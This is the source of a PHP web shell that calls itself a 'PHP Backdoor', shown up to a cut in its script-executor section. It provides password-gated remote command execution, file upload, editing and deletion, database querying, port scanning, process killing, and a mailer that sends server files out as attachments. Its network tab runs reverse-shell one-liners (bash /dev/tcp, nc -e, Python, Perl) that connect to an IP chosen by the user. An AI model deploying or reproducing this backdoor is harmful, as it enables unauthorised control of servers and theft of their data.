<?php
error_reporting(E_ALL);
session_start();

// Security check - change this password
$AUTH_PASSWORD = 'backdoor123';
$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (!$isAuthenticated && isset($_POST['password'])) {
    if ($_POST['password'] === $AUTH_PASSWORD) {
        $_SESSION['authenticated'] = true;
        $isAuthenticated = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Functions
function formatBytes($size, $precision = 2) {
    $base = log($size, 1024);
    $suffixes = array('B', 'KB', 'MB', 'GB', 'TB');
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
}

function getFilePermissions($file) {
    $perms = fileperms($file);
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $arr);
        $output = implode("\n", $arr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
    }
    return $output;
}

function searchFiles($dir, $pattern, $useRegex = false, $searchContent = false) {
    $results = [];
    if (!is_dir($dir)) return $results;
    
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filename = $file->getFilename();
            $filepath = $file->getPathname();
            
            if ($useRegex) {
                if (preg_match($pattern, $filename)) {
                    $results[] = $filepath;
                }
            } else {
                if (stripos($filename, $pattern) !== false) {
                    $results[] = $filepath;
                }
            }
            
            if ($searchContent && is_readable($filepath)) {
                $content = file_get_contents($filepath);
                if ($useRegex) {
                    if (preg_match($pattern, $content)) {
                        $results[] = $filepath . ' (content match)';
                    }
                } else {
                    if (stripos($content, $pattern) !== false) {
                        $results[] = $filepath . ' (content match)';
                    }
                }
            }
        }
    }
    
    return array_unique($results);
}

function getProcessList() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return executeCommand('tasklist');
    } else {
        return executeCommand('ps aux');
    }
}

function sendMail($to, $subject, $body, $attachment = null) {
    $headers = "From: backdoor@server.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    
    if ($attachment && file_exists($attachment)) {
        $boundary = md5(time());
        $headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
        
        $message = "--$boundary\r\n";
        $message .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
        $message .= $body . "\r\n";
        $message .= "--$boundary\r\n";
        
        $fileContent = base64_encode(file_get_contents($attachment));
        $fileName = basename($attachment);
        
        $message .= "Content-Type: application/octet-stream; name=\"$fileName\"\r\n";
        $message .= "Content-Disposition: attachment; filename=\"$fileName\"\r\n";
        $message .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $message .= chunk_split($fileContent);
        $message .= "--$boundary--";
        
        return mail($to, $subject, $message, $headers);
    } else {
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        return mail($to, $subject, $body, $headers);
    }
}

// Handle file operations
if ($isAuthenticated && isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file'])) {
                $uploadPath = $_POST['upload_path'] . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                    echo "<script>alert('File uploaded successfully');</script>";
                } else {
                    echo "<script>alert('Upload failed');</script>";
                }
            }
            break;
            
        case 'delete':
            if (isset($_POST['file_path'])) {
                if (is_file($_POST['file_path'])) {
                    unlink($_POST['file_path']) ? 
                        print("<script>alert('File deleted');</script>") : 
                        print("<script>alert('Delete failed');</script>");
                } elseif (is_dir($_POST['file_path'])) {
                    rmdir($_POST['file_path']) ? 
                        print("<script>alert('Directory deleted');</script>") : 
                        print("<script>alert('Delete failed');</script>");
                }
            }
            break;
            
        case 'rename':
            if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
                rename($_POST['old_name'], $_POST['new_name']) ? 
                    print("<script>alert('Renamed successfully');</script>") : 
                    print("<script>alert('Rename failed');</script>");
            }
            break;
            
        case 'create_dir':
            if (isset($_POST['dir_name'])) {
                mkdir($_POST['current_dir'] . '/' . $_POST['dir_name']) ? 
                    print("<script>alert('Directory created');</script>") : 
                    print("<script>alert('Create failed');</script>");
            }
            break;
            
        case 'save_file':
            if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
                file_put_contents($_POST['file_path'], $_POST['file_content']) !== false ? 
                    print("<script>alert('File saved');</script>") : 
                    print("<script>alert('Save failed');</script>");
            }
            break;
    }
}

$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($currentDir)) $currentDir = getcwd();

// Detect active tab from POST request
$activeTab = 'filemanager';
if (isset($_POST['active_tab'])) {
    $activeTab = $_POST['active_tab'];
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>JalanBelakang - PHP Backdoor</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: auto;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 20px;
        }
        
        .header h1 {
            font-size: 2.5em;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 10px;
        }
        
        .header .subtitle {
            color: #ff0066;
            font-size: 1.2em;
        }
        
        .menu {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            justify-content: center;
        }
        
        .menu-btn {
            background: linear-gradient(45deg, #ff0066, #00ff00);
            border: none;
            color: #000;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .menu-btn.active {
            background: linear-gradient(45deg, #00ff00, #ff0066);
            box-shadow: 0 0 15px #00ff00;
            transform: scale(1.05);
        }
        
        .content {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .file-list {
            display: grid;
            gap: 5px;
        }
        
        .file-item {
            display: grid;
            grid-template-columns: 1fr 100px 150px 200px 150px;
            padding: 8px;
            border-bottom: 1px solid #333;
            align-items: center;
        }
        
        .file-item:hover {
            background: rgba(0, 255, 0, 0.1);
        }
        
        .file-item a {
            color: #00ff00;
            text-decoration: none;
        }
        
        .file-item a:hover {
            color: #ff0066;
        }
        
        .directory {
            color: #00ccff !important;
        }
        
        input, textarea, select {
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 8px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            box-shadow: 0 0 5px #00ff00;
        }
        
        .btn {
            background: #ff0066;
            border: none;
            color: #fff;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
            margin: 5px;
        }
        
        .btn:hover {
            background: #cc0055;
        }
        
        .terminal {
            background: #000;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            overflow-x: auto;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .form-group {
            margin: 10px 0;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
        }
        
        .hidden {
            display: none;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .error {
            color: #ff0066;
            background: rgba(255, 0, 102, 0.1);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .success {
            color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .login-form {
            max-width: 400px;
            margin: 200px auto;
            text-align: center;
        }
        
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .info-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
        }
        
        .info-box h3 {
            color: #ff0066;
            margin-bottom: 10px;
        }
    </style>
    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            
            // Update menu buttons
            document.querySelectorAll('.menu-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Save active tab to localStorage
            localStorage.setItem('activeTab', tabName);
        }
        
        function confirmDelete(file) {
            return confirm('Are you sure you want to delete: ' + file + '?');
        }
        
        function openFile(file) {
            window.open('?action=view&file=' + encodeURIComponent(file), '_blank');
        }
        
        function downloadFile(file) {
            window.open('?action=download&file=' + encodeURIComponent(file), '_blank');
        }
        
        // Function to restore active tab after page reload
        function restoreActiveTab() {
            const activeTab = '<?php echo $activeTab; ?>';
            showTab(activeTab);
            
            // Update button appearance
            document.querySelectorAll('.menu-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.onclick.toString().includes(activeTab)) {
                    btn.classList.add('active');
                }
            });
        }
        
        // Restore tab when page loads
        window.addEventListener('load', restoreActiveTab);
    </script>
</head>
<body>

<?php if (!$isAuthenticated): ?>
    <div class="login-form">
        <div class="content">
            <h2><i class="fas fa-lock"></i> Authentication Required</h2>
            <form method="post">
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
        </div>
    </div>
<?php else: ?>

<div class="container">
    <div class="header">
        <h1><i class="fas fa-bolt"></i> JalanBelakang <i class="fas fa-bolt"></i></h1>
        <div class="subtitle">Advanced PHP Backdoor Research Tool</div>
        <div style="margin-top: 10px;">
            <span style="color: #00ccff;"><i class="fas fa-server"></i> Server: <?php echo $_SERVER['SERVER_NAME']; ?></span> | 
            <span style="color: #ff0066;"><i class="fas fa-network-wired"></i> IP: <?php echo $_SERVER['SERVER_ADDR']; ?></span> | 
            <a href="?logout" style="color: #ff0066;"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>
    </div>

    <!-- System Information -->
    <div class="system-info">
        <div class="info-box">
            <h3>System Information</h3>
            <strong>OS:</strong> <?php echo PHP_OS; ?><br>
            <strong>PHP Version:</strong> <?php echo PHP_VERSION; ?><br>
            <strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
            <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
        </div>
        <div class="info-box">
            <h3>Current Directory</h3>
            <strong>Path:</strong> <?php echo $currentDir; ?><br>
            <strong>Writable:</strong> <?php echo is_writable($currentDir) ? 'Yes' : 'No'; ?><br>
            <strong>Free Space:</strong> <?php echo formatBytes(disk_free_space($currentDir)); ?><br>
            <strong>Total Space:</strong> <?php echo formatBytes(disk_total_space($currentDir)); ?>
        </div>
        <div class="info-box">
            <h3>Server Status</h3>
            <strong>Uptime:</strong> <?php echo executeCommand('uptime'); ?><br>
            <strong>Load Average:</strong> <?php echo sys_getloadavg() ? implode(', ', sys_getloadavg()) : 'N/A'; ?><br>
            <strong>Memory Usage:</strong> <?php echo formatBytes(memory_get_usage(true)); ?>
        </div>
    </div>

    <!-- Navigation Menu -->
    <div class="menu">
        <button class="menu-btn" onclick="showTab('filemanager')"><i class="fas fa-folder-open"></i> File Manager</button>
        <button class="menu-btn" onclick="showTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button class="menu-btn" onclick="showTab('search')"><i class="fas fa-search"></i> Search</button>
        <button class="menu-btn" onclick="showTab('database')"><i class="fas fa-database"></i> Database</button>
        <button class="menu-btn" onclick="showTab('network')"><i class="fas fa-globe"></i> Network</button>
        <button class="menu-btn" onclick="showTab('processes')"><i class="fas fa-cogs"></i> Processes</button>
        <button class="menu-btn" onclick="showTab('mailer')"><i class="fas fa-envelope"></i> Mail</button>
        <button class="menu-btn" onclick="showTab('converter')"><i class="fas fa-exchange-alt"></i> Converter</button>
        <button class="menu-btn" onclick="showTab('script')"><i class="fas fa-code"></i> Script Executor</button>
    </div>

    <!-- File Manager Tab -->
    <div id="filemanager" class="tab-content <?php echo $activeTab == 'filemanager' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-folder-open"></i> File Manager</h2>
            
            <!-- Current Directory Navigation -->
            <div style="margin-bottom: 20px;">
                <strong>Current Directory:</strong> 
                <?php
                $pathParts = explode('/', $currentDir);
                $buildPath = '';
                foreach ($pathParts as $part) {
                    if ($part) {
                        $buildPath .= '/' . $part;
                        echo "<a href='?dir=" . urlencode($buildPath) . "' style='color: #00ccff;'>/$part</a>";
                    }
                }
                ?>
                <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>" style="color: #ff0066; margin-left: 20px;"><i class="fas fa-arrow-up"></i> Parent Directory</a>
            </div>

            <!-- File Operations -->
            <div style="margin-bottom: 20px; display: flex; gap: 10px; flex-wrap: wrap;">
                <!-- Upload Form -->
                <form method="post" enctype="multipart/form-data" style="display: inline-block;">
                    <input type="hidden" name="action" value="upload">
                    <input type="hidden" name="upload_path" value="<?php echo $currentDir; ?>">
                    <input type="hidden" name="active_tab" value="filemanager">
                    <input type="file" name="file" required>
                    <button type="submit" class="btn"><i class="fas fa-upload"></i> Upload</button>
                </form>

                <!-- Create Directory -->
                <form method="post" style="display: inline-block;">
                    <input type="hidden" name="action" value="create_dir">
                    <input type="hidden" name="current_dir" value="<?php echo $currentDir; ?>">
                    <input type="hidden" name="active_tab" value="filemanager">
                    <input type="text" name="dir_name" placeholder="Directory name" required>
                    <button type="submit" class="btn"><i class="fas fa-folder-plus"></i> Create Dir</button>
                </form>
            </div>

            <!-- File List -->
            <div class="file-list">
                <div class="file-item" style="background: rgba(0, 255, 0, 0.2); font-weight: bold;">
                    <div>Name</div>
                    <div>Size</div>
                    <div>Modified</div>
                    <div>Permissions</div>
                    <div>Actions</div>
                </div>

                <?php
                $files = scandir($currentDir);
                foreach ($files as $file) {
                    if ($file == '.') continue;
                    
                    $fullPath = $currentDir . '/' . $file;
                    $isDir = is_dir($fullPath);
                    $size = $isDir ? '--' : formatBytes(filesize($fullPath));
                    $modified = date('Y-m-d H:i:s', filemtime($fullPath));
                    $permissions = getFilePermissions($fullPath);
                    
                    echo "<div class='file-item'>";
                    if ($isDir) {
                        echo "<div><a href='?dir=" . urlencode($fullPath) . "' class='directory'><i class='fas fa-folder'></i> $file</a></div>";
                    } else {
                        echo "<div><a href='#' onclick=\"openFile('$fullPath')\"><i class='fas fa-file'></i> $file</a></div>";
                    }
                    echo "<div>$size</div>";
                    echo "<div>$modified</div>";
                    echo "<div>$permissions</div>";
                    echo "<div>";
                    
                    if (!$isDir) {
                        echo "<button class='btn' onclick=\"downloadFile('$fullPath')\"><i class='fas fa-download'></i> Download</button>";
                        echo "<button class='btn' onclick=\"openFile('$fullPath')\"><i class='fas fa-edit'></i> Edit</button>";
                    }
                    
                    echo "<form method='post' style='display: inline;' onsubmit=\"return confirmDelete('$file')\">";
                    echo "<input type='hidden' name='action' value='delete'>";
                    echo "<input type='hidden' name='file_path' value='$fullPath'>";
                    echo "<input type='hidden' name='active_tab' value='filemanager'>";
                    echo "<button type='submit' class='btn' style='background: #cc0000;'><i class='fas fa-trash'></i> Delete</button>";
                    echo "</form>";
                    echo "</div>";
                    echo "</div>";
                }
                ?>
            </div>
        </div>
    </div>

    <!-- Terminal Tab -->
    <div id="terminal" class="tab-content <?php echo $activeTab == 'terminal' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-terminal"></i> Terminal</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="terminal">
                <div class="form-group">
                    <label>Command:</label>
                    <input type="text" name="cmd" style="width: 70%;" placeholder="Enter command..." 
                           value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
                    <button type="submit" class="btn"><i class="fas fa-play"></i> Execute</button>
                </div>
            </form>
            
            <?php if (isset($_POST['cmd']) && $_POST['cmd']): ?>
            <div class="terminal">
root@server:<?php echo $currentDir; ?># <?php echo htmlspecialchars($_POST['cmd']); ?>

<?php echo htmlspecialchars(executeCommand($_POST['cmd'])); ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Search Tab -->
    <div id="search" class="tab-content <?php echo $activeTab == 'search' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-search"></i> File Search</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="search">
                <div class="form-group">
                    <label>Search Directory:</label>
                    <input type="text" name="search_dir" value="<?php echo $currentDir; ?>" style="width: 100%;">
                </div>
                <div class="form-group">
                    <label>Search Pattern:</label>
                    <input type="text" name="search_pattern" placeholder="filename or content pattern">
                </div>
                <div class="form-group">
                    <input type="checkbox" name="use_regex" id="use_regex">
                    <label for="use_regex" style="display: inline;">Use Regex</label>
                    
                    <input type="checkbox" name="search_content" id="search_content">
                    <label for="search_content" style="display: inline;">Search in File Content</label>
                </div>
                <button type="submit" name="do_search" class="btn"><i class="fas fa-search"></i> Search</button>
            </form>

            <?php if (isset($_POST['do_search']) && $_POST['search_pattern']): ?>
            <div class="terminal">
                <strong>Search Results:</strong><br><br>
                <?php
                $searchResults = searchFiles(
                    $_POST['search_dir'], 
                    $_POST['search_pattern'], 
                    isset($_POST['use_regex']), 
                    isset($_POST['search_content'])
                );
                
                if (empty($searchResults)) {
                    echo "No results found.";
                } else {
                    foreach ($searchResults as $result) {
                        echo htmlspecialchars($result) . "\n";
                    }
                }
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Database Tab -->
    <div id="database" class="tab-content <?php echo $activeTab == 'database' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-database"></i> Database Explorer</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="database">
                <div class="form-group">
                    <label>Database Type:</label>
                    <select name="db_type">
                        <option value="mysql">MySQL</option>
                        <option value="sqlite">SQLite</option>
                        <option value="pgsql">PostgreSQL</option>
                        <option value="mssql">SQL Server</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Host:</label>
                    <input type="text" name="db_host" value="localhost">
                </div>
                <div class="form-group">
                    <label>Database:</label>
                    <input type="text" name="db_name">
                </div>
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="db_user">
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="db_pass">
                </div>
                <div class="form-group">
                    <label>SQL Query:</label>
                    <textarea name="sql_query" rows="5" style="width: 100%;" placeholder="SELECT * FROM users LIMIT 10"></textarea>
                </div>
                <button type="submit" name="db_execute" class="btn"><i class="fas fa-play"></i> Execute Query</button>
            </form>

            <?php if (isset($_POST['db_execute'])): ?>
            <div class="terminal">
                <?php
                try {
                    $dsn = '';
                    switch ($_POST['db_type']) {
                        case 'mysql':
                            $dsn = "mysql:host={$_POST['db_host']};dbname={$_POST['db_name']}";
                            break;
                        case 'sqlite':
                            $dsn = "sqlite:{$_POST['db_name']}";
                            break;
                        case 'pgsql':
                            $dsn = "pgsql:host={$_POST['db_host']};dbname={$_POST['db_name']}";
                            break;
                    }
                    
                    $pdo = new PDO($dsn, $_POST['db_user'], $_POST['db_pass']);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                    
                    $stmt = $pdo->prepare($_POST['sql_query']);
                    $stmt->execute();
                    
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    
                    if ($results) {
                        echo "<table style='border-collapse: collapse; width: 100%;'>";
                        echo "<tr style='background: rgba(0, 255, 0, 0.2);'>";
                        foreach (array_keys($results[0]) as $column) {
                            echo "<th style='border: 1px solid #00ff00; padding: 8px;'>" . htmlspecialchars($column) . "</th>";
                        }
                        echo "</tr>";
                        
                        foreach ($results as $row) {
                            echo "<tr>";
                            foreach ($row as $value) {
                                echo "<td style='border: 1px solid #00ff00; padding: 8px;'>" . htmlspecialchars($value) . "</td>";
                            }
                            echo "</tr>";
                        }
                        echo "</table>";
                    } else {
                        echo "Query executed successfully. No results returned.";
                    }
                } catch (Exception $e) {
                    echo "<span style='color: #ff0066;'>Error: " . htmlspecialchars($e->getMessage()) . "</span>";
                }
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Network Tab -->
    <div id="network" class="tab-content <?php echo $activeTab == 'network' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-globe"></i> Network Tools</h2>
            
            <!-- Reverse Shell -->
            <h3><i class="fas fa-terminal"></i> Reverse Shell</h3>
            <form method="post">
                <input type="hidden" name="active_tab" value="network">
                <div class="form-group">
                    <label>Target IP:</label>
                    <input type="text" name="reverse_ip" placeholder="192.168.1.100">
                </div>
                <div class="form-group">
                    <label>Port:</label>
                    <input type="number" name="reverse_port" placeholder="4444">
                </div>
                <button type="submit" name="reverse_shell" class="btn"><i class="fas fa-link"></i> Connect Reverse Shell</button>
            </form>

            <?php if (isset($_POST['reverse_shell'])): ?>
            <div class="terminal">
                <?php
                $ip = $_POST['reverse_ip'];
                $port = $_POST['reverse_port'];
                
                if ($ip && $port) {
                    echo "Attempting reverse shell connection to $ip:$port...\n";
                    
                    // Different reverse shell methods
                    $shells = [
                        "bash -i >& /dev/tcp/$ip/$port 0>&1",
                        "nc -e /bin/sh $ip $port",
                        "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"",
                        "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                    ];
                    
                    foreach ($shells as $shell) {
                        echo "Trying: " . htmlspecialchars($shell) . "\n";
                        $output = executeCommand($shell);
                        if ($output) {
                            echo "Output: " . htmlspecialchars($output) . "\n";
                        }
                    }
                }
                ?>
            </div>
            <?php endif; ?>

            <!-- Port Scanner -->
            <h3><i class="fas fa-network-wired"></i> Port Scanner</h3>
            <form method="post">
                <input type="hidden" name="active_tab" value="network">
                <div class="form-group">
                    <label>Target Host:</label>
                    <input type="text" name="scan_host" placeholder="192.168.1.1">
                </div>
                <div class="form-group">
                    <label>Port Range:</label>
                    <input type="text" name="port_range" placeholder="1-1000" value="1-100">
                </div>
                <button type="submit" name="port_scan" class="btn"><i class="fas fa-search"></i> Scan Ports</button>
            </form>

            <?php if (isset($_POST['port_scan'])): ?>
            <div class="terminal">
                <?php
                $host = $_POST['scan_host'];
                $range = $_POST['port_range'];
                
                if ($host && $range) {
                    echo "Scanning $host for open ports in range $range...\n\n";
                    
                    list($start, $end) = explode('-', $range);
                    $start = (int)$start;
                    $end = (int)$end;
                    
                    for ($port = $start; $port <= $end; $port++) {
                        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
                        if ($connection) {
                            echo "Port $port: OPEN\n";
                            fclose($connection);
                        }
                    }
                    echo "\nScan completed.";
                }
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Processes Tab -->
    <div id="processes" class="tab-content <?php echo $activeTab == 'processes' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-cogs"></i> Process Manager</h2>
            <button onclick="location.reload()" class="btn"><i class="fas fa-sync-alt"></i> Refresh</button>
            
            <div class="terminal">
                <?php echo htmlspecialchars(getProcessList()); ?>
            </div>

            <h3><i class="fas fa-skull-crossbones"></i> Kill Process</h3>
            <form method="post">
                <input type="hidden" name="active_tab" value="processes">
                <div class="form-group">
                    <label>Process ID:</label>
                    <input type="number" name="kill_pid" placeholder="1234">
                    <button type="submit" name="kill_process" class="btn"><i class="fas fa-times"></i> Kill Process</button>
                </div>
            </form>

            <?php if (isset($_POST['kill_process']) && $_POST['kill_pid']): ?>
            <div class="terminal">
                <?php
                $pid = (int)$_POST['kill_pid'];
                echo "Attempting to kill process $pid...\n";
                echo htmlspecialchars(executeCommand("kill -9 $pid"));
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Mailer Tab -->
    <div id="mailer" class="tab-content <?php echo $activeTab == 'mailer' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-envelope"></i> Mail Sender</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="mailer">
                <div class="form-group">
                    <label>To:</label>
                    <input type="email" name="mail_to" required>
                </div>
                <div class="form-group">
                    <label>Subject:</label>
                    <input type="text" name="mail_subject" required>
                </div>
                <div class="form-group">
                    <label>Message:</label>
                    <textarea name="mail_body" rows="5" style="width: 100%;" required></textarea>
                </div>
                <div class="form-group">
                    <label>Attachment (file path):</label>
                    <input type="text" name="mail_attachment" placeholder="/path/to/file.txt">
                </div>
                <button type="submit" name="send_mail" class="btn"><i class="fas fa-paper-plane"></i> Send Mail</button>
            </form>

            <?php if (isset($_POST['send_mail'])): ?>
            <div class="terminal">
                <?php
                $result = sendMail(
                    $_POST['mail_to'],
                    $_POST['mail_subject'],
                    $_POST['mail_body'],
                    $_POST['mail_attachment'] ?: null
                );
                
                echo $result ? "Mail sent successfully!" : "Failed to send mail.";
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Converter Tab -->
    <div id="converter" class="tab-content <?php echo $activeTab == 'converter' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-exchange-alt"></i> String Converter</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="converter">
                <div class="form-group">
                    <label>Input Text:</label>
                    <textarea name="convert_input" rows="5" style="width: 100%;"><?php echo isset($_POST['convert_input']) ? htmlspecialchars($_POST['convert_input']) : ''; ?></textarea>
                </div>
                <div class="form-group">
                    <label>Conversion Type:</label>
                    <select name="convert_type">
                        <option value="base64_encode">Base64 Encode</option>
                        <option value="base64_decode">Base64 Decode</option>
                        <option value="url_encode">URL Encode</option>
                        <option value="url_decode">URL Decode</option>
                        <option value="md5">MD5 Hash</option>
                        <option value="sha1">SHA1 Hash</option>
                        <option value="sha256">SHA256 Hash</option>
                        <option value="html_encode">HTML Encode</option>
                        <option value="html_decode">HTML Decode</option>
                        <option value="hex_encode">Hex Encode</option>
                        <option value="hex_decode">Hex Decode</option>
                    </select>
                </div>
                <button type="submit" name="convert_string" class="btn"><i class="fas fa-sync-alt"></i> Convert</button>
            </form>

            <?php if (isset($_POST['convert_string']) && $_POST['convert_input']): ?>
            <div class="terminal">
                <strong>Result:</strong><br><br>
                <?php
                $input = $_POST['convert_input'];
                $type = $_POST['convert_type'];
                $result = '';
                
                switch ($type) {
                    case 'base64_encode':
                        $result = base64_encode($input);
                        break;
                    case 'base64_decode':
                        $result = base64_decode($input);
                        break;
                    case 'url_encode':
                        $result = urlencode($input);
                        break;
                    case 'url_decode':
                        $result = urldecode($input);
                        break;
                    case 'md5':
                        $result = md5($input);
                        break;
                    case 'sha1':
                        $result = sha1($input);
                        break;
                    case 'sha256':
                        $result = hash('sha256', $input);
                        break;
                    case 'html_encode':
                        $result = htmlspecialchars($input);
                        break;
                    case 'html_decode':
                        $result = htmlspecialchars_decode($input);
                        break;
                    case 'hex_encode':
                        $result = bin2hex($input);
                        break;
                    case 'hex_decode':
                        $result = hex2bin($input);
                        break;
                }
                
                echo htmlspecialchars($result);
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Script Executor Tab -->
    <div id="script" class="tab-content <?php echo $activeTab == 'script' ? 'active' : ''; ?>">
        <div class="content">
            <h2><i class="fas fa-code"></i> Script Executor</h2>
            <form method="post">
                <input type="hidden" name="active_tab" value="script">
                <div class="form-group">
                    <label>Script Type:</label>
                    <select name="script_type">
                        <option value="php">PHP</option>
                        <option value="python">Python</option>
                        <option value="perl">Perl</option>
